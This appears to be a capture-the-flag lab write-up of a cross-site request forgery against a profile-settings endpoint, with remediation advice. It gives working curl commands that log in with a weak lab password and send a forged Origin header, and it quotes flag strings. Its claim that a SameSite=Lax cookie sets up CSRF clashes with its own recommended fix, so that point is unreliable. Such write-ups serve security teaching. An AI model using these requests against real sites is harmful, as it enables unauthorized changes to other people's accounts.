# Flag 10 — Cross-Site Request Forgery (no Origin/Referer check)

**Flag:** `FLAG{csrf_4ny_0r1g1n_1s_w3lc0m3}`
**Location:** `POST /profile/me/settings` — on success the server 302-redirects to `/profile/me/settings?csrf_flag=FLAG{...}` (the flag is a URL parameter in the `Location` header).
**Severity:** High
**Class:** Cross-Site Request Forgery — a state-changing request with no anti-CSRF token and no server-side `Origin`/`Referer` validation.

## Discovery

The settings form submits `POST /profile/me/settings` to change account fields (`first_name`, `last_name`, `campus`). The request carries no hidden CSRF token, and the session cookie is `SameSite=lax` (seen in the login `Set-Cookie`). That combination is the classic CSRF setup: if the server also fails to check where the request came from, any other site can forge it.

## Exploitation

CSRF only needs a *valid logged-in session* — you forge a request as yourself to prove the server accepts it from a foreign origin. Getting that session is the only prerequisite; the password-reset route is SSO-blocked for `jdoe` on this build, so we log in by password instead (same foothold as Flag 01).

1. Log in as `jdoe` (weak password `abc123`) and save the session cookie:

```bash
TARGET=192.168.1.155
curl -s -i -c jar -X POST "http://$TARGET:4942/login" \
  --data-urlencode "identity=jdoe" --data-urlencode "password=abc123"
# -> 302 Location: /   +   Set-Cookie: session=...  (role:god)
```

2. Forge the settings change from a different origin, sending the session cookie but an attacker `Origin`/`Referer`:

```bash
curl -s -i -b jar -X POST "http://$TARGET:4942/profile/me/settings" \
  -H "Origin: https://horrible_last_flag" \
  -H "Referer: https://horrible_last_flag/x.html" \
  --data "first_name=CSRF&last_name=Test&campus=Wilcity"
# -> 302 Location: /profile/me/settings?csrf_flag=FLAG%7Bcsrf_4ny_0r1g1n_1s_w3lc0m3%7D
```

3. URL-decode the `csrf_flag` parameter (`%7B`->`{`, `%7D`->`}`):

```bash
python3 -c "import urllib.parse,sys;print(urllib.parse.unquote(sys.argv[1]))" \
  "FLAG%7Bcsrf_4ny_0r1g1n_1s_w3lc0m3%7D"
# FLAG{csrf_4ny_0r1g1n_1s_w3lc0m3}
```

A real attack skips the login step: it rides the victim's *already-present* session via an auto-submitting form on `horrible_last_flag` (see `csrf-poc.html`). The curl above proves the missing control — the server honoured a request whose `Origin` was a domain it does not own.

## Impact

Any page a logged-in user visits can silently change their account settings (name, campus, and anything else this endpoint accepts) without their knowledge or consent — no stolen password or token required. On an account with elevated role this extends to attacker-controlled modification of privileged profile data.

## Remediation

- Issue a per-session, per-form CSRF token and reject any state-changing request missing or mismatching it.
- Validate `Origin`/`Referer` against a server-side allow-list for POST/PUT/PATCH/DELETE.
- Set the session cookie `SameSite=Strict` (or at least `Lax`) so the browser does not attach it to cross-site requests.

## In simple terms

Changing your profile settings is just a POST request. The site checks that you're logged in (your session cookie) but never checks *which website* the request came from, and the form has no secret one-time token. So a completely unrelated site — `horrible_last_flag` — can fire that exact request from your browser, your cookie tags along automatically, and the server happily makes the change.

We proved it by sending the request with the header `Origin: https://horrible_last_flag` (a site we don't own) while carrying a real session. A safe server would reject a request coming from a foreign origin; this one accepted it and handed back the flag in the redirect URL. The fix is to make every change-request prove it came from the real site — a secret token the attacker can't guess, an origin check, and a cookie that won't travel cross-site.
